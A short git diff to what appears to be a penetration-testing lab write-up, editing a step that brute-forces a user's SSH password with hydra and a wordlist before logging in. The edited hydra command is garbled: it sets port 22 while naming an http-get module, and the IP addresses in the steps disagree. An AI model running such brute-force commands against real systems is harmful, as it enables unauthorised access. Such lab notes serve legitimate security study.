@@ -111,9 +111,11 @@ Getting information about open ports using nmap for all hosts in the range of IP
 
 - `ssh michael@192.168.1.10` reveals that it requires a password. We can use hydra to brute force it an then SSH again
 
-- `hydra -l michael -P /usr/share/john/password.lst -vV 192.168.1.110`
+- `hydra -l michael -P /usr/share/john/password.lst -s 22 -vV 192.168.1.110 http-get`
 
 - `ssh michael@192.168.1.10`
+
+![](images/hydra1.png) 
 
 - After log in some basic commands can be run for navigation
 
